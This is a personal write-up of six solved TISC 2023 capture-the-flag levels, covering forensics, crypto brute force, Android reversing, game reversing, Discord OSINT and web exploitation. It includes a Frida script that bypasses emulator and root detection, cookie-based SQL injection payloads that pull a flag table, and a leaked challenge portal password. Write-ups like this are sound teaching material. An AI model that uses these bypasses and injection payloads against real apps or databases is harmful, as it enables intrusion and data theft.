# TISC 2023 - Writeups

![solves](img/solves.png)

Solved 6 levels of TISC 2023 and got stuck at flag part 2 of Level 7 (DevSecMeow) :( skill issue

Place: 36th/1080 (eligible for swag prizes, yay)

But the true prizes were the cat pictures from Level 7 :<

<br />

Additional info about this CTF:


[TISC 2023 information](https://www.csit.gov.sg/events/tisc/tisc-2023)


[CSIT official post about TISC 2023](https://www.linkedin.com/posts/csitsg_csit-ctf-cybersecurity-activity-7117323481700044800-rt8i) <br /><br />



These are the challenges I solved and the challenge categories they belonged to!

Level 1: Disk Archaeology (Forensics)

Level 2: XIPHEREHPIX’s Reckless Mistake (Crypto)

Level 3: KPA (Mobile)

Level 4: Really Unfair Battleships Game (Pwn, Misc)

Level 5: PALINDROME’s Invitation (OSINT, Misc)

Level 6B: The Chosen Ones (Web) 

Additional: Level 7B: DevSecMeow (Cloud) <br /><br />

# Level 1: Disk Archaeology

> Unknown to the world, the sinister organization PALINDROME has been crafting a catastrophic malware that threatens to plunge civilization into chaos. Your mission, if you choose to accept it, is to infiltrate their secret digital lair, a disk image exfiltrated by our spies. This disk holds the key to unraveling their diabolical scheme and preventing the unleashing of a suspected destructive virus.   
> 
>You will be provided with the following file:  
> - md5(challenge.tar.xz) = 80ff51568943a39de4975648e688d6a3  
>  
>  Notes:  
>  - challenge.tar.xz decompresses into challenge.img  
>  - FLAG FORMAT is TISC{some text you have to find}
>  
>   Attached Files
>   challenge.tar.xz

**TLDR: Extract deleted ELF file from forensics image, and locate and run with the correct interpreter**

Extract the tar and we get a `challenge.img`

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ file challenge.img
challenge.img: Linux rev 1.0 ext4 filesystem data, UUID=2b4fee55-fd5f-483c-a85f-856944731f0f (extents) (64bit) (large files) (huge files)
```

Open up in autopsy and explore the filesystem. While exploring, there is a deleted ELF file. The strings in the file hints to parts of the flag: TISC{w4s_th3r3_s0m3th1ng_l3ft_%s}

![lvl-1-deleted-elf](img/lvl-1-deleted-elf.png)

We probably have to run this file or do some static analysis to get the rest of the flag.

But wait! We can’t actually run it yet. The binary requires `ld-musl-x86_64.so.1` interpreter, which after some searching, is part of the Alpine Linux: [https://pkgs.alpinelinux.org/contents?branch=edge&name=musl&arch=x86_64&repo=main](https://pkgs.alpinelinux.org/contents?branch=edge&name=musl&arch=x86_64&repo=main)

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ ./f0000008.elf 
bash: ./f0000008.elf: cannot execute: required file not found

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ ldd f0000008.elf                                                                                                                                                                       
        linux-vdso.so.1 (0x00007fffeca09000)
        libc.musl-x86_64.so.1 => not found

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ file f0000008.elf                                                                                                                                                                      
f0000008.elf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
```

Using `apt-find` you can actually find the package that contains the library. This gave me the interpreter which i needed to execute the binary and get the flag.

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ sudo apt-file find ld-musl-x86_64.so.1
musl: /lib/ld-musl-x86_64.so.1
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ sudo apt install musl
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/1]
└─$ ./f0000008.elf 
TISC{w4s_th3r3_s0m3th1ng_l3ft_ubrekeslydsqdpotohujsgpzqiojwzfq}
```

# Level 2: XIPHEREHPIX’s Reckless Mistake

> Our sources told us that one of PALINDROME's lieutenants, XIPHEREHPIX, wrote a special computer program for certain members of PALINDROME. We have somehow managed to get a copy of the source code and the compiled binary. The intention of the program is unclear, but we think encrypted blob inside the program could contain a valuable secret.
> 
>   Attached Files
>   prog.c
>   XIPHEREHPIX

**TLDR: Weakness in key generation algorithm led to reduced keyspace complexity that allowed for a keyspace brute force**

Running the binary, we can see that it asks for a password that is more than 40 characters long, which we do not have.

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/2]
└─$ ./XIPHEREHPIX 
Hello PALINDROME member, please enter password:
The password should be at least 40 characters as per PALINDROME's security policy.

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/2]
└─$ ./XIPHEREHPIX 
Hello PALINDROME member, please enter password:
Failure!
```


The source code is provided as part of the challenge files. Rough description of the different functions:

**`main()`**

- Requests for a password that is at least 40 characters
- Checks our password against `verify_password()`
- Runs `initialise_key()` followed by `show_welcome_message()` with the key that was generated

```python
int main(int argc, char **argv)
{
    char password[MAX_PASSWORD_SIZE + 1] = { 0 };
    int password_length;

    unsigned char key[32];

    printf("Hello PALINDROME member, please enter password:");

    password_length = input_password(password);
    if (password_length < 40) {
        printf("The password should be at least 40 characters as per PALINDROME's security policy.\n");
        exit(0);
    }

    if (!verify_password(password, password_length)) {
        initialise_key(key, password, password_length);
        show_welcome_msg(key);
    }
        
    else {
        printf("Failure! \n");
        exit(0);
    }
}
```

`verify_password()`

- Compares our password against a SHA256 hash `962fe02a147163af8003eb5b7ff756523220981f9f027e35fb933faadd7944b7`
- This probably can’t be bruteforced or guessed, since the password length is minimally 40 characters.
- If the password provided by the user matches the hash, then returns 0 (due to memcmp)

```python
int verify_password(char *password, int password_length) {
    unsigned char mdVal[EVP_MAX_MD_SIZE];
    unsigned int i;

    calculate_sha256(mdVal, password, password_length);

    uint64_t hash[] = { 0x962fe02a147163af,
                        0x8003eb5b7ff75652,
                        0x3220981f9f027e35,
                        0xfb933faadd7944b7};

    return memcmp(mdVal, hash, 32);
}
```

`initialise_key()` and `accumulate_xor()`

- Seed is initialized as "PALINDROME IS THE BEST!", which is used later in the first `calculate_sha256` call
- Creates an array `arr` of 20 elements, each with a size of 256 bits (due to uint256_t)
- The first element of the array is the SHA256 hash of our seed, and the subsequent elements are the SHA256 hash of the element preceding it.
    - First element arr[0]: SHA256("PALINDROME IS THE BEST!")
    - Second element: SHA256(arr[0])
    - Third element: SHA256(arr[1])
    - and so on…
- Loops through each character in our password and subsequenty each bit in the password (in the for (j = 0; j < 8; j++) { loop)
    - `counter` is set so that for each iteration of the bitloop, it’ll go through the next element of the array (so first iter select arr[0], next select arr[1] and so on, until it goes back to arr[0])
    - If the current bit in `ch` we are comparing is 0, no operation will be made
    - however, if the current bit in `ch` is 1, this runs the `accumulate_xor()`
        - which would just XOR the current key256 (which initially is set to 0s) with the selected arr element (based on counter)

```python
void initialise_key(unsigned char *key, char *password, int password_length) {
    const char *seed = "PALINDROME IS THE BEST!";
    int i, j;
    int counter = 0;

    uint256_t *key256  = (uint256_t *)key;

    key256->a0 = 0;
    key256->a1 = 0;
    key256->a2 = 0;
    key256->a3 = 0;

    uint256_t arr[20] = { 0 };

    calculate_sha256((unsigned char *) arr, (unsigned char *) seed, strlen(seed));

    for (i = 1; i < 20; i++) {
        calculate_sha256((unsigned char *)(arr+i), (unsigned char *) (arr+i-1), 32);
    }

    for (i = 0; i < password_length; i++) {
        int ch = password[i];
        for (j = 0; j < 8; j++) {
            counter = counter % 20;

            if (ch & 0x1) {
                accumulate_xor(key256, arr+counter);
            }

            ch = ch >> 1;
            counter++;
        }
    }
}

void accumulate_xor(uint256_t *result, uint256_t *arr_entry) {
    result->a0 ^= arr_entry->a0;
    result->a1 ^= arr_entry->a1;
    result->a2 ^= arr_entry->a2;
    result->a3 ^= arr_entry->a3;

}
```

`show_welcome_msg()`

- AES-GCM implementation to decrypt the ciphertext
- iv, tags etc are all known/fixed, which isn’t an ideal implementation
- However without knowledge of the correct key, we’re unable to really attack this implementation

```python
void show_welcome_msg(unsigned char *key) {
    int plaintext_length;
    unsigned char *iv = "PALINDROME ROCKS";
    
    unsigned char plaintext[128] = { 0 };
    const unsigned char * const header = "welcome_message";
    unsigned char ciphertext[] =
        "\xad\xac\x81\x20\xc6\xd5\xb1\xb8\x3a\x2a\xa8\x54\xe6\x5f\x9a\xad"
        "\xa4\x39\x05\xd9\x21\xae\xab\x50\x98\xbd\xe4\xc8\xe8\x2a\x3c\x63"
        "\x82\xe3\x8e\x5d\x79\xf0\xc6\xf4\xf2\xe7";

    unsigned char tag[] =
        "\xbd\xfc\xc0\xdb\xd9\x09\xed\x66\x37\x34\x75\x11\x75\xa2\x7a\xaf";

    plaintext_length = gcm_decrypt(ciphertext, 
                42,
                (unsigned char *)header,
                strlen(header),
                tag,
                key, 
                iv,
                16,
                plaintext);

    printf("Welcome PALINDROME member. Your secret message is %.*s\n", plaintext_length, plaintext);
}
```

From here, we can get the rough idea on how we can solve the challenge. The weakness lies in the `initialize_key` implementation, which essentially reduces the keyspace size to 2^20 due to the commutative properties of XOR. We’re not interested in the possible passwords anymore, but instead the possible keys that could have been used in the decryption function. We can do a keyspace brute force which allows us to recover the flag.


To solve this, we change the main function as follows. This will just test the `show_welcome_message` against every single possible key. Also do note that the size has been passed in as 3 bytes, as we’re trying to brute force 20 bits, essentially taking up 3 bytes. 


2^20 equates to 1048576, alternatively we can also use `i < (1 << 20)` instead of `i < 1048576`

```python
int main(int argc, char **argv)
{
    char password[MAX_PASSWORD_SIZE + 1] = { 0 };
    int password_length;

    unsigned char key[32];

    printf("Hello PALINDROME member, please enter password:");

    for(int i = 0; i < 1048576; i++) {
        unsigned char * bruteKey = (unsigned char *)&i;
        initialise_key(key, bruteKey, 3);
        show_welcome_msg(key);
    }
}
```


Compile and run the program, we can grep for the flag format and get our flag:

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/2]
└─$ gcc solve.c -o solve -lcrypto

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/2]
└─$ ./solve | grep TISC
Welcome PALINDROME member. Your secret message is TISC{K3ysP4ce_1s_t00_smol_d2g7d97agsd8yhr}
```

# Level 3: KPA

> We've managed to grab an app from a suspicious device just before it got reset! The copying couldn't finish so some of the last few bytes got corrupted... But not all is lost! We heard that the file shouldn't have any comments in it! Help us uncover the secrets within this app!
> 
>   Attached Files
>   kpa.apk

**TLDR: Fix corrupted apk, and bypass certain checks and locate secrets with dynamic analysis**

The challenge description hints to the last bytes of the file being corrupted. 

Apk files are pretty much zip files. We can look up the file structure of a zip file, and towards the end of the zip file there is an End of Central Directory record.

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

![lv3-1-eocdstruct](img/lv3-1-eocdstruct.png)

When we look at the EOCD record in our apk, we can find that the comment len is indicated as 0a instead of 00 bytes long. There are no comments in the file based on the challenge description, which is also seen as the apk file ends with 00s indicating no comments.

Changing the second last byte of our apk from 0a to 00 will fix it.

```bash
┌──(wayell㉿wayell)-[/tmp]
└─$ hd kpa.apk | tail -n 5
002b0d20  67 6f 6f 67 6c 65 2e 61  6e 64 72 6f 69 64 2e 6d  |google.android.m|
002b0d30  61 74 65 72 69 61 6c 5f  6d 61 74 65 72 69 61 6c  |aterial_material|
002b0d40  2e 76 65 72 73 69 6f 6e  50 4b 05 06 00 00 00 00  |.versionPK......|
002b0d50  d0 02 d0 02 7d bc 00 00  cb 50 2a 00 00 00        |....}....P*...|
002b0d5e
```

Now we can decompile the apk with any preferred tool, after a cursory glance, we find the main logic of the code, in MainActivity.

![lv3-1-mainactivity](img/lv3-2-mainactivity.png)

The code basically checks for whether the text after going through SHA1 1024 times.

```java
package com.tisc.kappa;
...
/* access modifiers changed from: private */
    public void M(String str) {
        char[] charArray = str.toCharArray();
        String valueOf = String.valueOf(charArray);
        for (int i2 = 0; i2 < 1024; i2++) {
            valueOf = N(valueOf, "SHA1");
        }
        if (!valueOf.equals("d8655ddb9b7e6962350cc68a60e02cc3dd910583")) {
            ((TextView) findViewById(d.f3935f)).setVisibility(4);
            Q(d.f3930a, 3000);
            return;
        }
```

We can run the app and do dynamic analysis instead, but it has some security checks in the MainActivity which calls other functions (from the j1 package) that checks if the device is from an emulator. When running the app in an emulator, the check would fail.

![lv3-3-afterbypass](img/lv3-3-beforebypass.png)

If we examine the code, we can actually bypass this with frida.

Corresponding snippets from the apk code that implement the emulator detection checks:

But a very brief summary is as follows,

- j1.a: checks the presence of apps and returns a counter of number of apps installed based on their strArr list, if the counter is 20 then the check will pass
- j1.b: checks for root detection which is common in android emulators, if the result from this is false, then the check has passed

![lv3-4-emudetect1](img/lv3-4-emudetect1.png)

![lv3-5-emudetect2](img/lv3-5-emudetect2.png)

![lv3-6-emudetect3](img/lv3-6-emudetect3.png)

We can use frida to hook the functions, and make them return the values we want. First upload and run frida-server

```python
C:\Users\wayel\Downloads\l3>adb push frida-server-x64 /data/local/tmp/frida-server
frida-server-x64: 1 file pushed, 0 skipped. 26.3 MB/s (108171000 bytes in 3.924s)

C:\Users\wayel\Downloads\l3>adb shell
vbox86p:/ # cd /data/local/tmp
vbox86p:/data/local/tmp # chmod +x frida-server
vbox86p:/data/local/tmp # ./frida-server
```


Frida script that we can use hook the functions to set the return values we want.


Corresponding checker logic in MainActivity:

`if (C1224a.m876a(packageManager) == 20) {`

`if (C1225b.m870e()) {m1515P("Suspicious device detected!", "CHECK FAILED", "BYE");}`

```jsx
Java.perform(function () {
	var pass1 = Java.use("j1.a");
    pass1.a.implementation = function () {
        return 20;
    };
    var pass2 = Java.use("j1.b");
    pass2.e.implementation = function () {
        return false;
    }; 
	console.log("Bypassed, check app")  
});
```

When we run the app using frida and our bypass script, it presents us with a page to submit a secret. But we don’t have the secret though?

```bash
C:\Users\wayel\Downloads\l3>frida -U -l bypass1.js -f com.tisc.kappa
     ____
    / _  |   Frida 16.0.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Nexus 6P (id=192.168.22.105:5555)
Spawned `com.tisc.kappa`. Resuming main thread!
[Nexus 6P::com.tisc.kappa ]-> Bypassed, check app
```

![lv3-7-afterbypass](img/lv3-7-afterbypass.png)

After searching around further in the code, i found this in one of the files which loads a library and sets a property KAPPA in the css(). As there were no other indicators of what could be the secret, I figured this was probably the key we were looking for.

[https://www.javatpoint.com/post/java-system-setproperty-method](https://www.javatpoint.com/post/java-system-setproperty-method)

```java
package com.tisc.kappa;

/* renamed from: com.tisc.kappa.sw */
public class C1054sw {
    static {
        System.loadLibrary("kappa");
    }

    /* renamed from: a */
    public static void m5575a() {
        try {
            System.setProperty("KAPPA", css());
        } catch (Exception unused) {
        }
    }

    private static native String css();
}
```

In frida, we can attempt to get the contents of this property with the following:

```jsx
var system = Java.use("java.lang.System");
console.log(system.getProperty("KAPPA"));
```

This actually prints a string `ArBraCaDabra?KAPPACABANA!` which seems to be the secret we are looking for!

```python
[Nexus 6P::com.tisc.kappa ]-> var system = Java.use("java.lang.System");
console.log(system.getProperty("KAPPA"));
ArBraCaDabra?KAPPACABANA!
```

![lv3-8-hookcallproperty](img/lv3-8-hookcallproperty.png)

This happens to be the password input, as if we hash it 1024 times, it gives us the same identical hash as the one we identified in our initial analysis:

```python
>>> import hashlib
>>> 
>>> def repeated_sha1(message, times):
...     for _ in range(times):
...         message = hashlib.sha1(message.encode()).hexdigest()
...     return message
... 
>>> message = "ArBraCaDabra?KAPPACABANA!"
>>> hashed_message = repeated_sha1(message, 1024)
>>> assert hashed_message == 'd8655ddb9b7e6962350cc68a60e02cc3dd910583'
>>> print("Found")
Found
```

Entering the string into the app gives us the flag

```python
TISC{C0ngr@tS!us0lv3dIT,KaPpA!}
```

![lv3-9-flag](img/lv3-9-flag.png)

# Level 4: Really Unfair Battleships Game

> After last year's hit online RPG game "Slay The Dragon", the cybercriminal organization PALINDROME has once again released another seemingly impossible game called "Really Unfair Battleships Game" (RUBG). This version of Battleships is played on a 16x16 grid, and you only have one life. Once again, we suspect that the game is being used as a recruitment campaign. So once again, you're up!
>
> Things are a little different this time. According to the intelligence we've gathered, just getting a VICTORY in the game is not enough.
>
> PALINDROME would only be handing out flags to hackers who can get a FLAWLESS VICTORY.
>
> You are tasked to beat the game and provide us with the flag (a string in the format TISC{xxx}) that would be displayed after getting a FLAWLESS VICTORY. Our success is critical to ensure the safety of Singapore's cyberspace, as it would allow us to send more undercover operatives to infiltrate PALINDROME.
>
> Godspeed!
>
> You will be provided with the following:
>
> 1) Windows Client (.exe)
    - Client takes a while to launch, please wait a few seconds.
    - If Windows SmartScreen pops up, tell it to run the client anyway.
    - If exe does not run, make sure Windows Defender isn't putting it on quarantine.
>
> 2) Linux Client (.AppImage)
    - Please install fuse before running, you can do "sudo apt install -y fuse"
    - Tested to work on Ubuntu 22.04 LTS
> 
>   Attached Files
>   rubg-1.0.0.AppImage
>   rubg_1.0.0.exe

**TLDR: reverse engineered electron app to solve certain win condition for battleships game that was randomized with every generated game instance**

The game .exe is an archive which we can extract.

```jsx
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ file rubg_1.0.0.exe                  
rubg_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive, 5 sections
```

Extracting the archive, we get a $PLUGINSDIR which contains an another archive which contains an app.asar. This confirms that it is a electron application, which we can then extract the source code.

```bash
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ cd '$PLUGINSDIR'
                                                                                                                                                                                             
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ ll                                               
total 68324
-rw-r--r-- 1 kali kali 69413654 Jul 17 11:39 app-64.7z
-rw-r--r-- 1 kali kali   434176 Oct  8 23:06 nsis7z.dll
-rw-r--r-- 1 kali kali   102400 Oct  8 23:06 StdUtils.dll
-rw-r--r-- 1 kali kali    12288 Oct  8 23:06 System.dll

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ 7z x app-64.7z

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ ll resources                  
total 12836
-rw-r--r-- 1 kali kali 13031793 Jul 17 11:39 app.asar
-rw-r--r-- 1 kali kali   107520 Jul 17 11:39 elevate.exe

┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/4]
└─$ npx asar extract resources/app.asar res
```

We have the code sources in res directory, and we can even deploy the game locally (which as of writing does not work anymore as the challenge server has been taken down, but will just write the rough idea and logical process of how i derived the solution)

```bash
cd res/dist
python3 -m http.server 
```

The main logic of the game is in `assets/index-c08c228b.js`, but its minified and obfuscated.

![lv-4-1-minified](img/lv-4-1-minified.png)

After beautifying the code, we can see there are multiple endpoints that can be called, infact they are also called by the client when the game starts:

```jsx
const Du = ee,
    ju = "http://rubg.chals.tisc23.ctf.sg:34567",
    Sr = Du.create({
        baseURL: ju
    });
async function Hu() {
    return (await Sr.get("/generate")).data
}
async function $u(e) {
    return (await Sr.post("/solve", e)).data
}
async function ku() {
    return (await Sr.get("/")).data
}
```

Variables that reference different files to be played when the game state changes, as well as one for flag_display

Here we can infer there are multiple game states - bomb, gameover, and victory, each having their respective audio played when the game state changes

```jsx
const Ku = "" + new URL("bomb-47e36b1b.wav", import.meta.url).href,
    qu = "" + new URL("gameover-c91fde36.wav", import.meta.url).href,
    _s = "" + new URL("victory-3e1ba9c7.wav", import.meta.url).href,
    it = e => (Hi("data-v-66546397"), e = e(), $i(), e),
    zu = {
        key: 0
    },
    Wu = it(() => W("div", {
        class: "connection-test"
    }, [W("h1", null, "Testing Connection with Server..."), W("span", {
        class: "subtitle"
    }, "(if this message persists, please ensure you have a stable internet connection and restart your client.)")], -1)),
    Ju = [Wu],
    Vu = {
        key: 1
    },
    Yu = it(() => W("div", {
        class: "connection-test"
    }, [W("h1", null, "Loading...")], -1)),
    Xu = [Yu],
    Qu = {
        key: 2,
        id: "main-menu"
    },

...

cf = {
        key: 0,
        class: "flag-display"
    },
```

Referencing the `_s` variable which is for the victory game state audio, we can find relevant snippets of code for it. This function looks to be the calculation where the game either decides on the victory or lose condition, looking at the audios that are played.

```jsx
function d(x) {
    return (t.value[Math.floor(x / 16)] >> x % 16 & 1) === 1
}

async function m(x) {
    if (d(x)) {
        if (t.value[Math.floor(x / 16)] ^= 1 << x % 16, 
            l.value[x] = 1, 
            new Audio(Ku).play(), 
            c.value.push(`${n.value.toString(16).padStart(16, "0")[15 - x % 16]}${r.value.toString(16).padStart(16, "0")[Math.floor(x / 16)]}`), 
            t.value.every(_ => _ === 0)) {

            if (JSON.stringify(c.value) === JSON.stringify([...c.value].sort())) {
                const _ = {
                    a: [...c.value].sort().join(""),
                    b: s.value
                };
                i.value = 101;
                o.value = (await $u(_)).flag;
                new Audio(_s).play();
                i.value = 4;
            } else {
                i.value = 3;
                new Audio(_s).play();
            }
        }
    } else {
        i.value = 2;
        new Audio(qu).play();
    }
}
```

When we launch the game, the server will send a json string to the client, containing 4 parameters, a, b, c, d, which the client gets from sending a request to `http://rubg.chals.tisc23.ctf.sg:34567/generate` 

The array `a` is used to determine whether a battleship is present in the cells. There are a total of 32 elements in `a`, and each pair represents a row. For example `1,0` will mean that in that particular row, a battleship exists at `o o o o o o o X o o o o o o o o` where X is the battleship, as the game code will count based on the 1 bits.

The array `b` and `c` is used to determine which order we are supposed to bomb the ships in. For this game, we can win by bombing the ships, but to get the flag we need to win by bombing the ships in a very specific order. We can find out the order from the `m(x)` function, which actually is just this snippet: 

```jsx
c.value.push(`${n.value.toString(16).padStart(16, "0")[15 - x % 16]}${r.value.toString(16).padStart(16, "0")[Math.floor(x / 16)]}`)
```

And lastly `d` is just some sort of challenge id which we have to send back to the server.

Final solver, we reconstruct the board with values from `a`, get the exact bomb order and send back to the server to get the flag.

```jsx
import requests
import json

def get_pos(grid_array):
    combined_grid = [(grid_array[i] << 8) + grid_array[i+1] for i in range(0, 32, 2)]
    positions = []
    
    for row_index, row_value in enumerate(combined_grid):
        for bit_index in range(16):
            if (row_value >> bit_index) & 1:
                positions.append(row_index * 16 + bit_index)
                
    return positions

def get_bomb_order(pos, b, c):
    mapped_order = []
    for position in pos:
        mapped_char = b[15 - (position % 16)] + c[position // 16]
        mapped_order.append((mapped_char, position))
        
    return sorted(mapped_order)

# Get challenge from server
out = requests.get("http://rubg.chals.tisc23.ctf.sg:34567/generate").text
challenge = json.loads(out)

# Extract arrays
a = challenge['a']
b = '{:016X}'.format(int(challenge['b']))
c = '{:016X}'.format(int(challenge['c']))
d = challenge['d']

# Getting ship positions and mapped bombing order
ship_positions = get_pos(a)
bombing_sequence = get_bomb_order(ship_positions, b, c)

# Constructing the result
result = {
    'a': "".join([item[0] for item in bombing_sequence]).lower(),
    'b': d
}

#print(result)
print(requests.post("http://rubg.chals.tisc23.ctf.sg:34567/solve", json=result).text)
#TISC{t4rg3t5_4cqu1r3d_fl4wl355ly_64b35477ac}
```

# Level 5: PALINDROME’s Invitation

> Valuable intel suggests that PALINDROME has established a secret online chat room for their members to discuss on plans to invade Singapore's cyber space. One of their junior developers accidentally left a repository public, but he was quick enough to remove all the commit history, only leaving some non-classified files behind. One might be able to just dig out some secrets of PALINDROME and get invited to their secret chat room...who knows?
>  
>  Start here: https://github.com/palindrome-wow/PALINDROME-PORTAL

**TLDR: Github and discord osint with a few rabbit holes**

The challenge link provided was a github repository.

![lv-5-0](img/lv-5-0.png)

There was a github workflow with reference to `secrets.PORTAL_URL` and `secrets.PORTAL_PASSWORD`

![lv-5-1](img/lv-5-1.png)

As github actions was also involved, i started off falling into one of the rabbit holes, along with many others, trying to exploit the github actions to print out the portal url and password.

[https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)

![lv-5-2](img/lv-5-2.png)

After a while, I decided to retrace my steps, and look further into the github actions. In the github actions logs, I realized that the previous workflow runs contained what is already the username and password!

This snippet is taken from the github actions logs.

![lv-5-3](img/lv-5-3.png)

portal: `chals.tisc23.ctf.sg:45938`

password: `:dIcH:..uU9gp1%3C@%3C3Q%22DBM5F%3C)64S%3C(01tF(Jj%25ATV@$Gl`

Note that the password is also url encoded, which i also spent some time figuring out why the portal was not accepting the password.

```jsx
Reading HSTS entries from /home/runneradmin/.wget-hsts
URI encoding = 'ANSI_X3.4-1968'
logging suppressed, strings may contain password
--2023-09-08 04:01:29--  ***/:dIcH:..uU9gp1%3C@%3C3Q%22DBM5F%3C)64S%3C(01tF(Jj%25ATV@$Gl
Resolving chals.tisc23.ctf.sg (chals.tisc23.ctf.sg)... 18.143.127.62, 18.143.207.255
Caching chals.tisc23.ctf.sg => 18.143.127.62 18.143.207.255
Connecting to chals.tisc23.ctf.sg (chals.tisc23.ctf.sg)|18.143.127.62|:45938... Closed fd 4
```

After logging in to the portal with the password, we are given a token along with a discord invite link. (didn’t save any screenshots here :( oops) I was already aware that discord tokens can be used to login, however I was not able to login as a normal user. After some time, I tried logging in as a bot instead with the same token using a third party client, and managed to get into the discord server! Probing around the discord channels reveals a exchange between Anya and Yor, about a super secret spy mission:

![lv-5-4](img/lv-5-4.png)

The discord client_id mentioned actually is the BetterInvites bot and the permissions 66688 permissions in discords maps to certain permissions in discord.

![lv-5-5](img/lv-5-5.png)

![lv-5-6](img/lv-5-6.png)

For a really long while, i fell into more rabbit holes trying different things on discord such as making a server with the bot which we authenticated with and the BetterInvites bot. I even tried adding the PALINDROME user in hopes that it would give me something (lol)

![lv-5-7](img/lv-5-7.png)

After failing to get anywhere, I went back to look into the server if there was any more pieces of information other than the original message clues. In fact, the 66688 permissions hints that we can View Audit Log. With our current bot user permissions, we could actually view the audit log of the server! More probing revealed what seemed to be what we were looking for: ****************an invite link!****************

![lv-5-8](img/lv-5-8.png)

Joining the discord server with that invite link triggered a special role from the BetterInvites bot, and gave us the flag!

![lv-5-9](img/lv-5-9.png)

```python
TISC{H4ppY_B1rThD4y_4nY4!}
```

# Level 6B: The Chosen Ones

> We have discovered PALINDROME's recruitment site. Infiltrate it and see what you can find!
>
> http://chals.tisc23.ctf.sg:51943

**TLDR: predict next lucky number in random function, and cookie SQL injection**

Honestly solved this challenge kind of based on intuition, hence the explaination may be slightly lacking. I was surprised at how easy this challenge was for a level 6?? 

Upon checking out the URL, we are greeted with a page that requests for a lucky number.

![lv6-0](img/lv6-0.png)

In the page source, there is some sort of base32 encoded text as a comment. After decoding, we get the following:

```python
function random() {
	$prev = $_SESSION["seed"];
	$current = (int) $prev ^ 844742906;
	$current = decbin($current);
	while (strlen($current) < 32) {
		$current = "0".$current;
	}
	$first = substr($current, 0, 7);
	$second = substr($current, 7, 25);
	$current = $second.$first;
	$current = bindec($current);
	$_SESSION["seed"] = $current;
	return $current % 1000000;
}
```

Every time we entered a number, it would mention that the number we entered was wrong and gave us the 6-digit lucky number. After some failed attempts at trying to guess the correct lucky number using the `random()` function which i found earlier, i decided to look into other possible avenues which i could possibly get information from. 

While searching the constants of the code (by simply googling `$prev ^ 844742906` ), chanced upon this code from google search: [https://onecompiler.com/php/3zhvjumwe](https://onecompiler.com/php/3zhvjumwe)

This seemed to be a way to brute force the possible seeds, and given that the code was released before the CTF started, hinted that this could be the possible correct direction to go

I then made very slight modifications to the code, allowing for a slightly larger range of numbers to be generated, and to print the full lucky number instead of the truncated lucky number.

```python
<?php

for ($x = 0; $x <= 15999; $x++) {
    $_SESSION["seed"] = <PUT LUCKY NUMBER HERE>+ 100000*$x;
    $prev = $_SESSION["seed"];
    
    $current = (int)$prev ^ 844742906;
    $current = decbin($current);
    while(strlen($current) < 32)
    {
        $current = "0".$current;
    }
    $first = substr($current,0,7);
    $second = substr($current,7,25);
    $current = $second.$first;
    $current = bindec($current);
    $_SESSION["seed"] = $current;
    
    echo "current: " . $current . " is " . $x . "\n";
    echo "current remainder: " . $current%1000000 . "\n";
}
?>
```

Whenever we entered a number, it would present us with the correct lucky number. I would then use this to try to calculate the next lucky number.

![lv6-1](img/lv6-1.png)

A rough summary on how we would be able to predict the next lucky number:

- so from the correct lucky number we got, calculate the possible next lucky numbers from the code modified above
- enter anything as the next guess
- then check if any hits for the next lucky number from the possibilities from the prev lucky number

We will need to find a match between two lucky numbers as the actual calculation of the next lucky number depends on the full length of the lucky number, not the 6 digit truncated version of the lucky number.

Using this process:

My previous lucky number was actually 515667, then i entered nothing as my next guess. Afterwards, I take the next lucky number which they displayed 659094 found a match in the next possible lucky numbers of the previous lucky number.

![lv6-2](img/lv6-2.png)

![lv6-3](img/lv6-3.png)

We would then take the current number which is the full lucky number (not the 6 digit lucky number)

```python
current: 216659094 is 5070
current remainder: 659094

216659094
```

We use the full lucky number in the next calculation, then take the first remainder, which is the next lucky number guess.

![lv6-4](img/lv6-4.png)

112799 would be the next lucky number, which we can enter to get to the next stage of the challenge. 

After submitting the right number, we get what is some sort of a search table. The first name and last name fields seems to be using LIKE queries.

![lv6-5](img/lv6-5.png)

After some testing of the fields, I realized that there was an SQL injection in the rank cookie.

```python
Cookie: PHPSESSID=d7qeso6h5feg15tpmcnn5pu8e8; rank=0 union select version(),66,77,88#--
```

![lv6-6](img/lv6-6.png)

Enumerate the database with the SQL injection, and get the flag.

```python
Cookie: PHPSESSID=d7qeso6h5feg15tpmcnn5pu8e8; rank=0 union select flag,66,77,88 from palindrome.CTF_SECRET#--
```

![lv6-7](img/lv6-7.png)

```jsx
TISC{Y0u_4rE_7h3_CH0s3n_0nE}
```


# Level 7B: DevSecMeow

> Palindrome has accidentally exposed one of their onboarding guide! Sneak in as a new developer and exfiltrate any meaningful intelligence on their production system.
> 
